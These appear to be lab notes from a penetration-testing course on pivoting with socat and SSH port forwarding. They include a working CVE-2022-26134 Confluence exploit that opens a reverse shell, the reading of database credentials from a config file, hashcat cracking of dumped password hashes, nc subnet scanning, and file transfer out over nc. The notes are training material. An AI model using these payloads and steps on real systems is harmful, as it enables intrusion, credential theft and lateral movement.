# Port Forwarding w/ socat

2. **Capstone Exercise**: Use the password found in the previous question to create a new port forward on CONFLUENCE01 and gain SSH access to PGDATABASE01 as the _database_admin_ user. What's the value of the flag found in **/tmp/socat_flag** on PGDATABASE01?

- Enumerate discovered IP
```bash
sudo nmap -Pn 192.168.247.63
	PORT     STATE SERVICE
	22/tcp   open  ssh
	8090/tcp open  opsmessaging
	
	Nmap done: 1 IP address (1 host up) scanned in 1.16 seconds

sudo nmap -sV 192.168.247.63 -p 8090
	PORT     STATE SERVICE       VERSION
	8090/tcp open  opsmessaging?
	1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
	SF-Port8090-TCP:V=7.94SVN%I=7%D=5/14%Time=6643E8FF%P=x86_64-pc-linux-gnu%r
	SF:(GetRequest,22F,"HTTP/1\.1\x20302\x20\r\nCache-Control:\x20no-store\r\n
	SF:Expires:\x20Thu,\x2001\x20Jan\x201970\x2000:00:00\x20GMT\r\nX-Confluenc    "#<--NOTE nX-Confluence
	SF:e
```

- Browse to 192.168.247.63:8090
- Wappalyzer shows Atlassian Confluence v7.13.6
- Search for exploits (atlassian confluence 7.13.6 exploit)
	- 1st result: [Rapid7 write-up](https://www.rapid7.com/blog/post/2022/06/02/active-exploitation-of-confluence-cve-2022-26134/)
  
- Grab payload
```perl
curl -v http://10.0.0.28:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/10.0.0.28/1270%200%3E%261%27%29.start%28%29%22%29%7D/
```

- Verify decoded content
```scss
${new javax.script.ScriptEngineManager().getEngineByName("nashorn").eval("new java.lang.ProcessBuilder().command('bash','-c','bash -i >& /dev/tcp/10.0.0.28/1270 0>&1').start()")}
```

- Change to work for our scenario
```perl
curl -v http://192.168.247.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.45.154/1270%200%3E%261%27%29.start%28%29%22%29%7D/
```

- Start nc listener in Tab1, run curl command in Tab2.  Catch reverse shell in Tab1
```bash
# Tab 1
nc -nlvp 1270
	listening on [any] 1270 ...
	connect to [192.168.45.154] from (UNKNOWN) [192.168.247.63] 48350
	bash: cannot set terminal process group (2086): Inappropriate ioctl for device
	bash: no job control in this shell
	bash: /root/.bashrc: Permission denied
	confluence@confluence01:/opt/atlassian/confluence/bin$
```

- Check network connections and routing info
```bash
confluence@confluence01:/opt/atlassian/confluence/bin$ ip addr
	1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
	    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
	    inet 127.0.0.1/8 scope host lo
	       valid_lft forever preferred_lft forever
	    inet6 ::1/128 scope host 
	       valid_lft forever preferred_lft forever
	4: ens192: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
	    link/ether 00:50:56:bf:df:6a brd ff:ff:ff:ff:ff:ff
	    inet 192.168.247.63/24 brd 192.168.247.255 scope global ens192      #<--NOTE
	       valid_lft forever preferred_lft forever
	5: ens224: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
	    link/ether 00:50:56:bf:fc:f3 brd ff:ff:ff:ff:ff:ff
	    inet 10.4.247.63/24 brd 10.4.247.255 scope global ens224            #<--NOTE
	       valid_lft forever preferred_lft forever

confluence@confluence01:/opt/atlassian/confluence/bin$ ip route
	default via 192.168.247.254 dev ens192 proto static 
	10.4.247.0/24 dev ens224 proto kernel scope link src 10.4.247.63 
	192.168.247.0/24 dev ens192 proto kernel scope link src 192.168.247.63
```

- Check confluence config file
```bash
cat /var/atlassian/application-data/confluence/confluence.cfg.xml
	<sian/application-data/confluence/confluence.cfg.xml   
	<?xml version="1.0" encoding="UTF-8"?>
	
	<confluence-configuration>
	  <setupStep>complete</setupStep>
	  <setupType>custom</setupType>
	  <buildNumber>8703</buildNumber>
	  <properties>
	...
	    <property name="hibernate.connection.password">D@t4basePassw0rd!</property>
	    <property name="hibernate.connection.url">jdbc:postgresql://10.4.247.215:5432/confluence</property>
	    <property name="hibernate.connection.username">postgres</property>
	    ...
```

- Check for socat and start a port forward via socat on CONFLUENCE01
```bash
confluence@confluence01:/opt/atlassian/confluence/bin$ which socat
	/usr/bin/socat


confluence@confluence01:/opt/atlassian/confluence/bin$ socat TCP-LISTEN:2345,fork TCP:10.4.247.215:5432 & 
	2024/05/14 23:05:55 socat[3858] I socat by Gerhard Rieger and contributors - see www.dest-unreach.org
	2024/05/14 23:05:55 socat[3858] I This product includes software developed by the OpenSSL Project for use in the OpenSSL Toolkit. (http://www.openssl.org/)
	2024/05/14 23:05:55 socat[3858] I This product includes software written by Tim Hudson (tjh@cryptsoft.com)
	2024/05/14 23:05:55 socat[3858] I setting option "fork" to 1
	2024/05/14 23:05:55 socat[3858] I socket(2, 1, 6) -> 5
	2024/05/14 23:05:55 socat[3858] I starting accept loop
	2024/05/14 23:05:55 socat[3858] N listening on AF=2 0.0.0.0:2345
```

- Connect via Postgres on Kali
```bash
psql -h 192.168.247.63 -p 2345 -U postgres
	Password for user postgres:         #<-- NOTE:  D@t4basePassw0rd! - Found w/in Confluence's config file
	psql (16.2 (Debian 16.2-1), server 12.12 (Ubuntu 12.12-0ubuntu0.20.04.1))
	SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, compression: off)
	Type "help" for help.
	
	postgres=# 
```

- Continue enumeration
```bash
# Get list of databases
postgres=#  \l
	                                                        List of databases
	    Name    |  Owner   | Encoding | Locale Provider |   Collate   |    Ctype    | ICU Locale | ICU Rules |   Access privileges   
	------------+----------+----------+-----------------+-------------+-------------+------------+-----------+-----------------------
	 confluence | postgres | UTF8     | libc            | en_US.UTF-8 | en_US.UTF-8 |            |           | 
	 postgres   | postgres | UTF8     | libc            | en_US.UTF-8 | en_US.UTF-8 |            |           | 
	 template0  | postgres | UTF8     | libc            | en_US.UTF-8 | en_US.UTF-8 |            |           | =c/postgres          +
	            |          |          |                 |             |             |            |           | postgres=CTc/postgres
	 template1  | postgres | UTF8     | libc            | en_US.UTF-8 | en_US.UTF-8 |            |           | =c/postgres          +
	            |          |          |                 |             |             |            |           | postgres=CTc/postgres
	(4 rows)

# Step into confluence db
postgres=# \c confluence
	psql (16.2 (Debian 16.2-1), server 12.12 (Ubuntu 12.12-0ubuntu0.20.04.1))                                                 
	SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, compression: off)                                      
	You are now connected to database "confluence" as user "postgres".                                                        

# Enum tables
postgres=# \dt
	                         List of relations
	 Schema |                 Name                  | Type  |  Owner   
	--------+---------------------------------------+-------+----------
	 public | AO_187CCC_SIDEBAR_LINK                | table | postgres
	 public | AO_21D670_WHITELIST_RULES             | table | postgres
	 public | AO_21F425_MESSAGE_AO                  | table | postgres
	 public | AO_21F425_MESSAGE_MAPPING_AO          | table | postgres
	 public | AO_21F425_USER_PROPERTY_AO            | table | postgres
	 ...
	 public | cwd_user                              | table | postgres
	 public | cwd_user_attribute                    | table | postgres
	 public | cwd_user_credential_record            | table | postgres
	 ...


# Dump cwd_user table
confluence=# select * from cwd_user;
	   id   |   user_name    | lower_user_name | active |      created_date       |      updated_date       | first_name | lower_first_name |   last_name   | lower_last_name |      display_name      |   lower_display_name   |           email_address            |        lower_email_address         |             external_id              | directory_id |                                credential                                 
	--------+----------------+-----------------+--------+-------------------------+-------------------------+------------+------------------+---------------+-----------------+------------------------+------------------------+------------------------------------+------------------------------------+--------------------------------------+--------------+---------------------------------------------------------------------------
	 229377 | admin          | admin           | T      | 2022-09-09 21:10:26.365 | 2022-09-09 21:10:26.365 | Alice      | alice            | Admin         | admin           | Alice Admin            | alice admin            | alice@industries.internal          | alice@industries.internal          | d9da2333-8bd1-4a8e-82d3-0613aead5d22 |        98305 | {PKCS5S2}3vfgC35A7Gnrxlzbvp32yM8zXvdE8U8bxS9bkP+3aS3rnSJxz4bJ6wqtE8d95ejA
	 229378 | trouble        | trouble         | T      | 2022-09-09 21:13:04.598 | 2022-09-09 21:13:04.598 |            |                  | Trouble       | trouble         | Trouble                | trouble                | trouble@industries.internal        | trouble@industries.internal        | 84bcf8cf-618d-4bec-b5c0-1b4a21fbcd6b |        98305 | {PKCS5S2}tnbti4h38VDOh0xPrBHr7JBYjev7wws+ETHL1YyjSpIWVUz+66zXwDvbBJkJz342
	 229379 | happiness      | happiness       | T      | 2022-09-09 21:13:35.831 | 2022-09-09 21:13:35.831 |            |                  | Happiness     | happiness       | Happiness              | happiness              | happiness@industries.internal      | happiness@industries.internal      | 8b9c660a-cfee-48ac-8214-737df1786dd2 |        98305 | {PKCS5S2}1hCLEv054BGYa9QkCAZKSmotKb4d8WbuDc/gGxHngs0cL3+fJ4OmCt6+fUM6HYlc
	 229380 | hr_admin       | hr_admin        | T      | 2022-09-09 21:13:58.548 | 2022-09-09 21:13:58.548 | HR         | hr               | Admin         | admin           | HR Admin               | hr admin               | hr_admin@industries.internal       | hr_admin@industries.internal       | 0d31acb5-ba51-4725-ae64-ae7f5d51becc |        98305 | {PKCS5S2}aBZZw3HfmgYN3Dzg/Pg7GjagLdo+eRg+0JCCVId/KyNT4oVlNbhWPJtJNazs4F5R
	 229381 | database_admin | database_admin  | T      | 2022-09-09 21:14:22.459 | 2022-09-09 21:14:22.459 | Database   | database         | Admin Account | admin account   | Database Admin Account | database admin account | database_admin@industries.internal | database_admin@industries.internal | 93d97033-f7d4-4a3c-80f4-55cc5faf03c7 |        98305 | {PKCS5S2}ueMu+nTGBtfeGXGBlXXFcJLdSF4uVHkZxMQ1Bst8wm3uhZcDs56a2ProZiSOk2hv
	 229382 | rdp_admin      | rdp_admin       | T      | 2022-09-09 21:14:46.153 | 2022-09-09 21:14:46.153 | RDP        | rdp              | Admin         | admin           | RDP Admin              | rdp admin              | rdp_admin@industries.internal      | rdp_admin@industries.internal      | a8f8d9b5-dfcb-480b-b461-8efce939294c |        98305 | {PKCS5S2}vCcYx3LxTYB2KH2Sq4wLNLdAcS+4lX/yTQrvBJngifUEXcnIUHEwW0YnOe86W8tP
	(6 rows)
```

- Dump hashes in `hashes.txt` file
```bash
{PKCS5S2}3vfgC35A7Gnrxlzbvp32yM8zXvdE8U8bxS9bkP+3aS3rnSJxz4bJ6wqtE8d95ejA # - alice admin
{PKCS5S2}tnbti4h38VDOh0xPrBHr7JBYjev7wws+ETHL1YyjSpIWVUz+66zXwDvbBJkJz342 # - trouble
{PKCS5S2}1hCLEv054BGYa9QkCAZKSmotKb4d8WbuDc/gGxHngs0cL3+fJ4OmCt6+fUM6HYlc # - happiness
{PKCS5S2}aBZZw3HfmgYN3Dzg/Pg7GjagLdo+eRg+0JCCVId/KyNT4oVlNbhWPJtJNazs4F5R # - hr admin
{PKCS5S2}ueMu+nTGBtfeGXGBlXXFcJLdSF4uVHkZxMQ1Bst8wm3uhZcDs56a2ProZiSOk2hv # - database admin account
{PKCS5S2}vCcYx3LxTYB2KH2Sq4wLNLdAcS+4lX/yTQrvBJngifUEXcnIUHEwW0YnOe86W8tP # - rdp admin
```
- Crack admin's hash
```bash
# Get hash type
hashcat -h | grep -i "Atlassian"
	12001 | Atlassian (PBKDF2-HMAC-SHA1)                               | Framework

# Crack
hashcat -m 12001 hashes.txt /usr/share/wordlists/fasttrack.txt
	{PKCS5S2}aBZZw3HfmgYN3Dzg/Pg7GjagLdo+eRg+0JCCVId/KyNT4oVlNbhWPJtJNazs4F5R:Welcome1234 # - hr admin
	{PKCS5S2}vCcYx3LxTYB2KH2Sq4wLNLdAcS+4lX/yTQrvBJngifUEXcnIUHEwW0YnOe86W8tP:P@ssw0rd!   # - rdp admin
	{PKCS5S2}ueMu+nTGBtfeGXGBlXXFcJLdSF4uVHkZxMQ1Bst8wm3uhZcDs56a2ProZiSOk2hv:sqlpass123  # - database admin account
	Approaching final keyspace - workload adjusted.
```

- After further enumeration, discover an SSH server on POSTGRESQL
```bash
nc -zv 10.4.247.63 1-1024 2>&1 | grep succeeded 
	Connection to 10.4.247.63 22 port [tcp/ssh] succeeded!
```

- Kill original socat port forward and establish a new one to the SSH server
- **NOTE** - If original socat command wasn't started in the background (a ` &` appended to the command), it'll be impossible to kill the process, and you'll have to revert the machines.
```bash
# Kill original port forward
confluence@confluence01:/opt/atlassian/confluence/bin$ ps aux | grep socat
	conflue+    3157  0.0  0.0   6968  1772 ?        S    00:40   0:00 socat TCP-LISTEN:2345,fork TCP:10.4.153.215:5432
	conflue+    3225  0.0  0.0   6432   656 ?        S    00:42   0:00 grep socat
confluence@confluence01:/opt/atlassian/confluence/bin$ kill -9 3157
confluence@confluence01:/opt/atlassian/confluence/bin$ ps aux | grep socat
	conflue+    3300  0.0  0.0   6432   656 ?        S    00:45   0:00 grep socat

# Establish new one to SSH server
confluence@confluence01:/opt/atlassian/confluence/bin$ socat TCP-LISTEN:2222,fork TCP:10.4.153.215:22 &
```

- Connect to SSH server via Kali
```bash
ssh database_admin@192.168.153.63 -p 2222

database_admin@pgdatabase01:~$ whoami
	database_admin

database_admin@pgdatabase01:~$ hostname
	pgdatabase01

database_admin@pgdatabase01:~$ cat /tmp/socat_flag
	OS{d228ce8e0809a85d009c2904dcef3635}
```



# SSH Tunneling

## Local SSH Port Forwarding

2. Start VM Group 2. A server is running on HRSHARES port 4242. Download the **ssh_local_client** binary from **hxxp://CONFLUENCE01:8090/exercises/ssh_local_client**. Create an SSH local port forward on CONFLUENCE01, which will let you run the **ssh_local_client** from your Kali machine against the server on HRSHARES and retrieve the flag.

Note: the source files used to build the **ssh_local_client** binary can be downloaded from **/exercises/client_source.zip**.


- Start by exploiting Confluence Server with CVE-2022-26134 exploit and upgrade TTY
```bash
# Tab 1 - nc listener
nc -nlvp 1270

# Tab 2 - exploit
curl -v http://192.168.233.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.45.154/1270%200%3E%261%27%29.start%28%29%22%29%7D/

# Tab 1 - CONFLUENCE01 revshell
python3 -c 'import pty; pty.spawn("/bin/sh")'
```

- Find location of **ssh_local_client** and download to Kali
	- Attempted `scp` first, but it didn't work
```bash
# On Kali
nc -nlvp 4444 > ssh_local_client

# On CONFLUENCE01
find / -name ssh_local_client 2>/dev/null
	/opt/atlassian/confluence/confluence/exercises/ssh_local_client

cd /opt/atlassian/confluence/confluence/exercises/

# -q 1 option tells nc to quit after the data is sent
nc -q 1 192.168.45.154 4444 < ssh_local_client
```
	- Do again for client_source.zip

- Enumerate
```bash
# Look for network connections
ip addr
	...
	4: ens192: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
	    link/ether 00:50:56:bf:21:be brd ff:ff:ff:ff:ff:ff
	    inet 192.168.233.63/24 brd 192.168.233.255 scope global ens192
	       valid_lft forever preferred_lft forever
	5: ens224: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
	    link/ether 00:50:56:bf:d5:0d brd ff:ff:ff:ff:ff:ff
	    inet 10.4.233.63/24 brd 10.4.233.255 scope global ens224     #<-- NOTE
	       valid_lft forever preferred_lft forever

# Enum for endpoints and open ports on 10.4.233.x subnet
	# Careful.... this takes FOREVER
for i in $(seq 1 254); do nc -zv -w 1 10.4.233.$i 1-1024 2>&1 | grep succeeded; done
	Connection to 10.4.233.215 22 port [tcp/ssh] succeeded!
	# Honestly, best to scan IPs for specific ports (like 22, 445, etc) seperately as the grep cmd leaves you asking if the full cmd is working at all
		# Ex: for i in $(seq 1 254); do nc -zv -w 1 10.4.233.$i 22 2>&1 | grep succeeded; done
```

- SSH into PGDATABASE01 using creds discovered (assuming previously from a dump)
```bash
# In CONFLUENCE01
ssh database_admin@10.4.233.215
```

- Enumerate
```bash
# In PGDATABASE01 - Look for network connections
ip addr
	...
	4: ens192: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
	    link/ether 00:50:56:bf:90:91 brd ff:ff:ff:ff:ff:ff
	    inet 10.4.233.215/24 brd 10.4.233.255 scope global ens192
	       valid_lft forever preferred_lft forever
	5: ens224: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
	    link/ether 00:50:56:bf:0b:b8 brd ff:ff:ff:ff:ff:ff
	    inet 172.16.233.254/24 brd 172.16.233.255 scope global ens224
	       valid_lft forever preferred_lft forever

# Enum for endpoints and open ports on 172.16.233.x subnet
	# Again, going to target specific ports
for i in $(seq 1 254); do nc -zv -w 1 172.16.233.$i 445 2>&1 | grep succeeded; done
	Connection to 172.16.233.217 445 port [tcp/microsoft-ds] succeeded!
```

- Setup SSH Port Forward from w/in Confluence
```bash
# Kill existing SSH connection to PGDATABASE01
database_admin@pgdatabase01:~$ ps aux | grep ssh                                                                                                        
	root         880  0.0  0.3  12172  7272 ?        Ss   16:22   0:00 sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups    
	root        8077  0.0  0.4  13920  8964 ?        Ss   18:11   0:00 sshd: database_admin [priv]
	databas+    8239  0.0  0.2  14052  5992 ?        S    18:11   0:00 sshd: database_admin@pts/0
	root       10210  0.0  0.4  13916  9056 ?        Ss   18:37   0:00 sshd: database_admin [priv]
	databas+   10305  0.0  0.2  14052  5276 ?        S    18:37   0:00 sshd: database_admin@pts/1
	databas+   10322  0.0  0.0   6300   724 pts/1    S+   18:37   0:00 grep --color=auto ssh
	
database_admin@pgdatabase01:~$ kill -9 10305
	Connection to 10.4.233.215 closed by remote host.
	Connection to 10.4.233.215 closed.


# Setup Local Port Forwarder
ssh -N -L 0.0.0.0:4242:172.16.233.217:4242 database_admin@10.4.233.215
	Could not create directory '/home/confluence/.ssh'.
	The authenticity of host '10.4.233.215 (10.4.233.215)' can't be established.
	ECDSA key fingerprint is SHA256:GMUxFQSTWYtQRwUc9UvG2+8toeDPtRv3sjPyMfmrOH4.
	Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
	yes
	Failed to add the host to the list of known hosts (/home/confluence/.ssh/known_hosts).
	database_admin@10.4.233.215's password: sqlpass123

```

- In new Kali tab, get flag
```bash
# Read through client_source.zip files.  Notice they're in Ruby
# Attempt ssh through executing ssh_local_client
chmod +x ssh_local_client

./ssh_local_client -i 192.168.233.63 -p 4242
	Connecting to 192.168.233.63:4242
	Flag: "OS{0ccdf0d584981c5fd0061c873fc7be2d}"
```